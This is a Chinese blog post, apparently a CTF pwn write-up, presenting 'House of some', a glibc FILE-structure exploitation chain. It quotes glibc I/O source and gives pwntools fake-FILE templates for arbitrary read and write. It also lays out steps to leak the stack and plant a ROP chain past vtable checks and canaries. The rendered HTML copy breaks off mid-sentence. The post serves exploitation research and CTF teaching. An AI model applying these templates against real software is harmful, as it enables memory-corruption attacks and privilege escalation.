{"title":"Bring back the stack attack -- House of some一种高版本glibc的利用思路","date":"2023-11-17T14:21:52.000Z","toc":true,"source":"_posts/house-of-some.md","raw":"---\ntitle: \"Bring back the stack attack -- House of some一种高版本glibc的利用思路\"\ncomments: true\ntoc: true\ndate: 2023-11-17 22:21:52\ntags:\n  - CTF\n  - Pwn\n  - House\n---\n\n# 概述\n\nHouse of some是一条改进House of apple2的新链，也是一种攻击思路，效果十分显著，并且可以适用于未来的高版本，可以实现任意地址写，其中触发条件为\n\n1. 已知glibc基地址\n2. 可控的已知地址（可写入内容构造fake file）\n3. 需要一次libc内任意地址写可控地址\n4. 程序能正常退出或者通过exit()退出\n\nHouse of some具有以下优点：\n\n1. 无视目前的`IO_validate_vtable`检查（wide_data的vtable加上检查也可以打）\n2. 第一次任意地址写要求低\n3. 最后攻击提权是栈上ROP，可以不需要栈迁移\n4. 源码级攻击，不依赖编译结果\n\n自动化脚本(将于2024年2月1日发布)https://github.com/CsomePro/Some-of-House\n\n# 利用思路\n\n## 构造任意地址写的fake file\n\n首先回顾一下House of apple2 https://bbs.kanxue.com/thread-273832.htm\n\n其中有一条链是如下进行的\n\n```c++\n_IO_wfile_overflow\n    _IO_wdoallocbuf\n        _IO_WDOALLOCATE\n            *(fp->_wide_data->_wide_vtable + 0x68)(fp)\n```\n\n如果`fp->_wide_data->_wide_vtable`加上了检查，那么只能选择虚表内的函数进行执行，我们能够选什么呢？\n\n那么就需要`_IO_new_file_underflow`这个函数出场了\n\n```c\nint\n_IO_new_file_underflow (FILE *fp)\n{\n  ssize_t count;\n\n  /* C99 requires EOF to be \"sticky\".  */\n  if (fp->_flags & _IO_EOF_SEEN)\n    return EOF;\n\n  if (fp->_flags & _IO_NO_READS)\n    {\n      fp->_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return EOF;\n    }\n  if (fp->_IO_read_ptr < fp->_IO_read_end)\n    return *(unsigned char *) fp->_IO_read_ptr;\n\n  if (fp->_IO_buf_base == NULL)\n    {\n      /* Maybe we already have a push back pointer.  */\n      if (fp->_IO_save_base != NULL)\n\t{\n\t  free (fp->_IO_save_base);\n\t  fp->_flags &= ~_IO_IN_BACKUP;\n\t}\n      _IO_doallocbuf (fp);\n    }\n\n  /* FIXME This can/should be moved to genops ?? */\n  if (fp->_flags & (_IO_LINE_BUF|_IO_UNBUFFERED))\n    {\n      /* We used to flush all line-buffered stream.  This really isn't\n\t required by any standard.  My recollection is that\n\t traditional Unix systems did this for stdout.  stderr better\n\t not be line buffered.  So we do just that here\n\t explicitly.  --drepper */\n      _IO_acquire_lock (stdout);\n\n      if ((stdout->_flags & (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))\n\t  == (_IO_LINKED | _IO_LINE_BUF))\n\t_IO_OVERFLOW (stdout, EOF);\n\n      _IO_release_lock (stdout);\n    }\n\n  _IO_switch_to_get_mode (fp);\n\n  /* This is very tricky. We have to adjust those\n     pointers before we call _IO_SYSREAD () since\n     we may longjump () out while waiting for\n     input. Those pointers may be screwed up. H.J. */\n  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;\n  fp->_IO_read_end = fp->_IO_buf_base;\n  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end\n    = fp->_IO_buf_base;\n\n  count = _IO_SYSREAD (fp, fp->_IO_buf_base,\n\t\t       fp->_IO_buf_end - fp->_IO_buf_base);\n  if (count <= 0)\n    {\n      if (count == 0)\n\tfp->_flags |= _IO_EOF_SEEN;\n      else\n\tfp->_flags |= _IO_ERR_SEEN, count = 0;\n  }\n  fp->_IO_read_end += count;\n  if (count == 0)\n    {\n      /* If a stream is read to EOF, the calling application may switch active\n\t handles.  As a result, our offset cache would no longer be valid, so\n\t unset it.  */\n      fp->_offset = _IO_pos_BAD;\n      return EOF;\n    }\n  if (fp->_offset != _IO_pos_BAD)\n    _IO_pos_adjust (fp->_offset, count);\n  return *(unsigned char *) fp->_IO_read_ptr;\n}\n```\n\n我们可以发现在`_IO_new_file_underflow`函数内会调用`_IO_SYSREAD (fp, fp->_IO_buf_base,fp->_IO_buf_end - fp->_IO_buf_base)`宏其对应的常规read函数如下\n\n```c\nssize_t\n_IO_file_read (FILE *fp, void *buf, ssize_t size)\n{\n  return (__builtin_expect (fp->_flags2 & _IO_FLAGS2_NOTCANCEL, 0)\n\t  ? __read_nocancel (fp->_fileno, buf, size)\n\t  : __read (fp->_fileno, buf, size));\n}\n```\n\n最后是调用syscall(read)读，我们可以看到read的三个参数都是可控的\n\n- `fd`=>`fp->_fileno`\n- `buf`=>`fp->_IO_buf_base`\n- `size`=>`fp->_IO_buf_end - fp->_IO_buf_base`\n\n那么就可以构造一个任意地址写，那么有了任意地址写之后有啥用呢？FSOP！\n\n我们再回到`_IO_flush_all`函数观察一下\n\n```c\nint\n_IO_flush_all (void)\n{\n  int result = 0;\n  FILE *fp;\n\n#ifdef _IO_MTSAFE_IO\n  _IO_cleanup_region_start_noarg (flush_cleanup);\n  _IO_lock_lock (list_all_lock);\n#endif\n\n  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)\n    {\n      run_fp = fp;\n      _IO_flockfile (fp);\n\n      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)\n\t   || (_IO_vtable_offset (fp) == 0\n\t       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr\n\t\t\t\t    > fp->_wide_data->_IO_write_base))\n\t   )\n\t  && _IO_OVERFLOW (fp, EOF) == EOF)\n\tresult = EOF;\n\n      _IO_funlockfile (fp);\n      run_fp = NULL;\n    }\n\n#ifdef _IO_MTSAFE_IO\n  _IO_lock_unlock (list_all_lock);\n  _IO_cleanup_region_end (0);\n#endif\n\n  return result;\n}\n```\n\n其中的for循环我们可以看到对于`_IO_list_all`上的单向链表，通过了`_chain`串起来，并在`_IO_flush_all`中，会遍历链表上每一个FILE，如果条件成立，就可以调用`_IO_OVERFLOW(fp, EOF) `\n\n```c\nfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain) \n{\n    ...\n      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)\n\t   || (_IO_vtable_offset (fp) == 0\n\t       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr\n\t\t\t\t    > fp->_wide_data->_IO_write_base))\n\t   )\n\t  && _IO_OVERFLOW (fp, EOF) == EOF)\n\t...\n}\n```\n\n那么接下来就开始构造一个实现任意地址写的fake file\n\n由于`_IO_new_file_underflow`内有一个`_IO_switch_to_get_mode`函数其中有这个分支\n\n```c\nif (fp->_IO_write_ptr > fp->_IO_write_base)\n    if (_IO_OVERFLOW (fp, EOF) == EOF)\n      return EOF;\n```\n\n如果还是使用`fp->_IO_write_ptr > fp->_IO_write_base`来使得触发OVERFLOW就会出现无限递归，所以不可行，我们需要采取另一个分支，即\n\n```c\nif (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) // 不可行\n\t   || (_IO_vtable_offset (fp) == 0                      // 使用||之后的分支\n\t       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr\n\t\t\t\t    > fp->_wide_data->_IO_write_base))\n\t   )\n\t  && _IO_OVERFLOW (fp, EOF) == EOF)\n```\n\n那么实现任意地址读的fake file设置如下\n\n- `_flags`设置为`~(2 | 0x8 | 0x800)`，设置为`0`即可（与apple2相同）\n- `vtable`设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap`地址，使得调用`_IO_wfile_overflow`即可（注意此处与apple2不同的是，此处的vtable不能加偏移，否则会打乱`_IO_SYSREAD`的调用）\n- `_wide_data->_IO_write_base`设置为`0`，即满足`*(_wide_data + 0x18) = 0`（与apple2相同）\n- `_wide_data->_IO_write_ptr`设置为大于`_wide_data->_IO_write_base`，即满足`*(_wide_data + 0x20) > *(_wide_data + 0x18)`（注意此处不同）\n- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(_wide_data + 0x30) = 0`（与apple2相同）\n- `_wide_data->_wide_vtable`设置为任意一个包含`_IO_new_file_underflow`，其中原生的vtable就有，设置成`_IO_file_jumps-0x48`即可\n- `_vtable_offset`设置为`0`\n- `_IO_buf_base`与`_IO_buf_end`设置为你需要写入的地址范围\n- `_chain`设置为你下一个触发的fake file地址\n- `_IO_write_ptr <= _IO_write_base`即可\n- `_fileno`设置为`0`，表示`read(0, buf, size)`\n- `_mode`设置为`2`，满足`fp->_mode > 0`即可\n\n一个任意地址写的fake file模板如下\n\n```python\nfake_file_read = flat({\n    0x00: 0, # _flags\n    0x20: 0, # _IO_write_base\n    0x28: 0, # _IO_write_ptr\n    \n    0x38: 任意地址写的起始地址, # _IO_buf_base\n    0x40: 任意地址写的终止地址, # _IO_buf_end\n\t\n    0x70: 0, # _fileno\n    0x82: b\"\\x00\", # _vtable_offset\n    0xc0: 2, # _mode\n    0xa0: wide_data的地址, # _wide_data\n    0x68: 下一个调用的fake file地址, # _chain\n    0xd8: _IO_wfile_jumps, # vtable\n}, filler=b\"\\x00\")\n\nfake_wide_data = flat({\n    0xe0: _IO_file_jumps - 0x48,\n    0x18: 0,\n    0x20: 1,\n    0x30: 0,\n}, filler=b\"\\x00\")\n```\n\n## 构造任意地址读的fake file\n\n这个就很简单了，以前也有这些研究，利用`_IO_write_base`和`_IO_write_ptr`实现任意地址读，这里给出构造模板，具体原理网上有很多教程\n\n```python\nfake_file_write = flat({\n    0x00: 0x800 | 0x1000, # _flags\n    \n    0x20: 需要泄露的起始地址, # _IO_write_base\n    0x28: 需要泄露的终止地址, # _IO_write_ptr\n\n    0x70: 1, # _fileno\n    0x68: 下一个调用的fake file地址, # _chain\n    0xd8: _IO_file_jumps, # vtable\n}, filler=b\"\\x00\")\n```\n\n## FSOP！\n\n我们已经有了任意地址读、任意地址写的fake file构造，那么只需要将其用`_chain`串起来就可以达成强大的攻击效果\n\n那么我将House of some的攻击流程分成4步（RWRWR过程）（这也是一个广泛的思路，拥有任意地址写就不止一个方法了）\n\n- 第一步  任意地址写`_chain`，这里可以写`_IO_list_all`或者stdin、stdout、stderr的`_chain`位置，在这一步需要在可控地址上布置一个任意地址写的Fake file，之后将Fake file地址写入上述位置\n- 第二步 扩展fake file链条并泄露栈地址，在第一步的中，我们只有一个fake file，并不能完成更复杂的操作，所以这一步我们需要写入两个fake file，一个用于泄露`environ`内的值（即栈地址），另一个用于写入下一个fake file\n- 第三步 泄露栈内数据，并寻找ROP起始地址，这一步同样需要写入两个fake file，一个任意地址读，读取栈上内存，另一个任意地址写，向栈上写ROP\n- 第三步 写入ROP，实现栈上ROP攻击！\n\n下图是攻击的图示，黄色代表`_IO_flush_all`还未遍历的FILE，黑色代表已经处理过的FILE\n\n![House of some](house-of-some/House-of-some.png)\n\n# 简单的分析\n\n这个链条是基于House of apple2基础上衍生的，为什么需要apple2呢？因为，在意外调用vtable的过程中，需要给vtable项加上偏移，但是`_IO_SYSREAD`等宏也是通过偏移索引，所以会导致偏移出错无法按照预定逻辑，那么就想到wide data内的vtable，修改此处的偏移可以不影响IO FILE的vtable。\n\n这个利用链条从源码中分析得出，不依赖二进制编译结果，以及可以无视加上wide data内的vtable的检查，这就导致了非常强大的泛用性。\n\n同时House of some带回了原生的FSOP流程（RWRWR过程），我们重新回到了起点——angelboy提出的FSOP原来的样子，利用chain把一个一个fake file串起来，通过多次的fake file调用`_IO_OVERFLOW`，实现二次泄露甚至多次泄露，使得我们游走在任意地址中，修改任意的地址内容！\n\n为何选择栈上ROP，因为这是最简单最有效最暴力的攻击方法，可以无需栈迁移，无视canary（任意读可以泄露，甚至我能控制写入起点，可以选择canary后面作为起点），最后栈溢出永不过时！\n","slug":"house-of-some","published":true,"updated":"2025-10-28T08:00:40.767Z","_id":"cuidQMgQCOE0Lk_CVlxZJYvpX","comments":true,"layout":"post","photos":[],"html":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>House of some是一条改进House of apple2的新链，也是一种攻击思路，效果十分显著，并且可以适用于未来的高版本，可以实现任意地址写，其中触发条件为</p>\n<ol>\n<li>已知glibc基地址</li>\n<li>可控的已知地址（可写入内容构造fake file）</li>\n<li>需要一次libc内任意地址写可控地址</li>\n<li>程序能正常退出或者通过exit()退出</li>\n</ol>\n<p>House of some具有以下优点：</p>\n<ol>\n<li>无视目前的<code>IO_validate_vtable</code>检查（wide_data的vtable加上检查也可以打）</li>\n<li>第一次任意地址写要求低</li>\n<li>最后攻击提权是栈上ROP，可以不需要栈迁移</li>\n<li>源码级攻击，不依赖编译结果</li>\n</ol>\n<p>自动化脚本(将于2024年2月1日发布)<a href=\"https://github.com/CsomePro/Some-of-House\">https://github.com/CsomePro/Some-of-House</a></p>\n<h1 id=\"利用思路\"><a href=\"#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h1><h2 id=\"构造任意地址写的fake-file\"><a href=\"#构造任意地址写的fake-file\" class=\"headerlink\" title=\"构造任意地址写的fake file\"></a>构造任意地址写的fake file</h2><p>首先回顾一下House of apple2 <a href=\"https://bbs.kanxue.com/thread-273832.htm\">https://bbs.kanxue.com/thread-273832.htm</a></p>\n<p>其中有一条链是如下进行的</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_wfile_overflow</span><br><span class=\"line\">    _IO_wdoallocbuf</span><br><span class=\"line\">        _IO_WDOALLOCATE</span><br><span class=\"line\">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class=\"number\">0x68</span>)(fp)</span><br></pre></td></tr></table></figure>\n\n<p>如果<code>fp-&gt;_wide_data-&gt;_wide_vtable</code>加上了检查，那么只能选择虚表内的函数进行执行，我们能够选什么呢？</p>\n<p>那么就需要<code>_IO_new_file_underflow</code>这个函数出场了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\">_IO_new_file_underflow (FILE *fp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">ssize_t</span> count;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class=\"line\">      __set_errno (EBADF);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> *(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* Maybe we already have a push back pointer.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (fp-&gt;_IO_save_base != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t  <span class=\"built_in\">free</span> (fp-&gt;_IO_save_base);</span><br><span class=\"line\">\t  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">      _IO_doallocbuf (fp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class=\"line\"><span class=\"comment\">\t required by any standard.  My recollection is that</span></span><br><span class=\"line\"><span class=\"comment\">\t traditional Unix systems did this for stdout.  stderr better</span></span><br><span class=\"line\"><span class=\"comment\">\t not be line buffered.  So we do just that here</span></span><br><span class=\"line\"><span class=\"comment\">\t explicitly.  --drepper */</span></span><br><span class=\"line\">      _IO_acquire_lock (<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((<span class=\"built_in\">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class=\"line\">\t  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class=\"line\">\t_IO_OVERFLOW (<span class=\"built_in\">stdout</span>, EOF);</span><br><span class=\"line\"></span><br><span class=\"line\">      _IO_release_lock (<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_switch_to_get_mode (fp);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* This is very tricky. We have to adjust those</span></span><br><span class=\"line\"><span class=\"comment\">     pointers before we call _IO_SYSREAD () since</span></span><br><span class=\"line\"><span class=\"comment\">     we may longjump () out while waiting for</span></span><br><span class=\"line\"><span class=\"comment\">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class=\"line\">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class=\"line\">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class=\"line\">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class=\"line\">    = fp-&gt;_IO_buf_base;</span><br><span class=\"line\"></span><br><span class=\"line\">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class=\"line\">\t\t       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (count &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (count == <span class=\"number\">0</span>)</span><br><span class=\"line\">\tfp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">\tfp-&gt;_flags |= _IO_ERR_SEEN, count = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  fp-&gt;_IO_read_end += count;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (count == <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class=\"line\"><span class=\"comment\">\t handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class=\"line\"><span class=\"comment\">\t unset it.  */</span></span><br><span class=\"line\">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class=\"line\">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以发现在<code>_IO_new_file_underflow</code>函数内会调用<code>_IO_SYSREAD (fp, fp-&gt;_IO_buf_base,fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)</code>宏其对应的常规read函数如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span></span><br><span class=\"line\">_IO_file_read (FILE *fp, <span class=\"type\">void</span> *buf, <span class=\"type\">ssize_t</span> size)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class=\"number\">0</span>)</span><br><span class=\"line\">\t  ? __read_nocancel (fp-&gt;_fileno, buf, size)</span><br><span class=\"line\">\t  : __read (fp-&gt;_fileno, buf, size));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后是调用syscall(read)读，我们可以看到read的三个参数都是可控的</p>\n<ul>\n<li><code>fd</code>&#x3D;&gt;<code>fp-&gt;_fileno</code></li>\n<li><code>buf</code>&#x3D;&gt;<code>fp-&gt;_IO_buf_base</code></li>\n<li><code>size</code>&#x3D;&gt;<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code></li>\n</ul>\n<p>那么就可以构造一个任意地址写，那么有了任意地址写之后有啥用呢？FSOP！</p>\n<p>我们再回到<code>_IO_flush_all</code>函数观察一下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\">_IO_flush_all (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  FILE *fp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class=\"line\">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class=\"line\">  _IO_lock_lock (list_all_lock);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (fp = (FILE *) _IO_list_all; fp != <span class=\"literal\">NULL</span>; fp = fp-&gt;_chain)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      run_fp = fp;</span><br><span class=\"line\">      _IO_flockfile (fp);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (((fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class=\"line\">\t   || (_IO_vtable_offset (fp) == <span class=\"number\">0</span></span><br><span class=\"line\">\t       &amp;&amp; fp-&gt;_mode &gt; <span class=\"number\">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class=\"line\">\t   )</span><br><span class=\"line\">\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class=\"line\">\tresult = EOF;</span><br><span class=\"line\"></span><br><span class=\"line\">      _IO_funlockfile (fp);</span><br><span class=\"line\">      run_fp = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class=\"line\">  _IO_lock_unlock (list_all_lock);</span><br><span class=\"line\">  _IO_cleanup_region_end (<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中的for循环我们可以看到对于<code>_IO_list_all</code>上的单向链表，通过了<code>_chain</code>串起来，并在<code>_IO_flush_all</code>中，会遍历链表上每一个FILE，如果条件成立，就可以调用<code>_IO_OVERFLOW(fp, EOF) </code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (fp = (FILE *) _IO_list_all; fp != <span class=\"literal\">NULL</span>; fp = fp-&gt;_chain) </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (((fp-&gt;_mode &lt;= <span class=\"number\">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class=\"line\">\t   || (_IO_vtable_offset (fp) == <span class=\"number\">0</span></span><br><span class=\"line\">\t       &amp;&amp; fp-&gt;_mode &gt; <span class=\"number\">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class=\"line\">\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class=\"line\">\t   )</span><br><span class=\"line\">\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class=\"line\">\t...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>那么接下来就开始构造一个实现任意地址写的fake file</p>\n<p>由于<code>_IO_new_file_underflow</code>内有一个<code>_IO_switch_to_get_mode</code>函数其中有这个分支</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (_IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class=\"line\">      <span class=\"keyword\">return</span> EOF;</span><br></pre></td></tr></table></figure>\n\n<p>如果还是使用<code>fp-&gt;_IO_write_ptr 